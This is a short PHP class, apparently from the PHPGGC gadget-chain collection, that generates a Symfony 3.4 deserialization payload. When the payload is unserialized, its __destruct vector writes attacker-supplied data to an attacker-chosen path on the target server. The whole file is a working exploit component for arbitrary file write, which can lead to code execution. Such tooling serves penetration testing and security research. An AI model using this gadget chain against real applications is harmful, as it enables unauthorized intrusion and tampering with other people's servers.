<?php

namespace GadgetChain\Symfony;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public $version = '3.4';
    public $vector = '__destruct';
    public $author = 'RicterZ';

    public function generate(array $parameters)
    {
    	$path = $parameters['remote_path'];
    	$data = $parameters['data'];
    	return new \Symfony\Bridge\PhpUnit\Legacy\SymfonyTestsListenerTrait(
    		$path,
    		$data
    	);
    }
}